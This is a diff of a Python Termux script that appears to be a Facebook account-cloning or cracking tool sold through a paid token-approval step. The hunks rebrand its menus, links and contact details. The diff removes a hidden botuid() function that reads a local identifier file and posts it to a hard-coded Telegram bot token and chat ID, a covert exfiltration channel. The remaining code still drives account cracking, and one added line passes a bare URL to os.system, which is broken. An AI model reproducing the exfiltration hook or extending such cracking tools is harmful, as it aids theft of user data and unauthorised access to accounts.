@@ -167,15 +167,6 @@ def uid(nam):
 		kok=open('/data/data/com.termux/files/usr/etc/uidtermux', 'w')
 		kok.write(uid,nam)
 		kok.close()
-	botuid()
-def botuid():
-	key2 = open('/data/data/com.termux/files/usr/etc/uidtermux', 'r').read()
-	bot_token = '6023459177:AAHGA-S0g230gklrxyg7n0vTFPJ8RI1Dq34'
-	chat_id = '1818606358'
-	message = key2
-	url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
-	data = {'chat_id': chat_id, 'text': message}
-	response = requests.post(url, json=data)        
 	
 def lo(word):
     heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
@@ -317,7 +308,7 @@ def approval():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.gethttps://github.com/safwangaiming11.text
+    httpCaht = requests.get('https://github.com/safwangaiming11/APPROVAL/blob/main/approve.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
       msg = str(os.geteuid())
@@ -335,7 +326,7 @@ def approval():
       print('Send Pay And Give Ss And Send Me Key Or Ss Me Whatsapp')
       print('\33[1;37m----------------------------------------------')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/qr/7VB37KNYDG74K1='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/01568722961='+tks),approval()
       time.sleep(1)
       approval()
   except:
@@ -352,15 +343,15 @@ def menu():
 	print ("\033[1;97m[3]\033[1;33m MY Facebook ID")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
 	if ot == '1':
-		os.system('xdg-open https://youtu.be/MfchhZ0mmFk')
+		os.system('xdg-open https://github.com/safwangaiming11')
 		crack_file()
 		
 	if ot == '2':
-		os.system('xdg-open https://youtu.be/Y1PT0WMpXv8')
+		os.system('xdg-open https://facebook.com/groups/627578409453077/')
 		rndm()
 		
 	if ot == '3':
-		os.system('xdg-open https://facebook.com/100074591152479')
+		os.system('https://www.facebook.com/profile.php?id=100028392141273')
 		menu()
 		
 	else:
@@ -375,16 +366,16 @@ def menu1():
 	clear()
 	print ("\033[1;97m     [1]\033[1;33m FILE CLONING")
 	print ("\033[1;97m     [2]\033[1;33m BANGLADESH NUMBER")
-	print ("\033[1;97m     [3]\033[1;33m MY YOUTUBE CHANEL")
+	print ("\033[1;97m     [3]\033[1;33m CONTACT OWNER")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
 	if ot == '1':
-		os.system('xdg-open https://youtu.be/MfchhZ0mmFk')
+		os.system('xdg-open https://github.com/safwangaiming11')
 		crack_file()
 	if ot == '2':
-		os.system('xdg-open https://youtu.be/Y1PT0WMpXv8')
+		os.system('xdg-open https://facebook.com/groups/627578409453077/')
 		rndm()
 	if ot == '3':
-		os.system('xdg-open https://youtube.com/@timmedley101')
+		os.system('xdg-open chat.whatsapp.com/01568722961')
 
 	else:
 		menu()
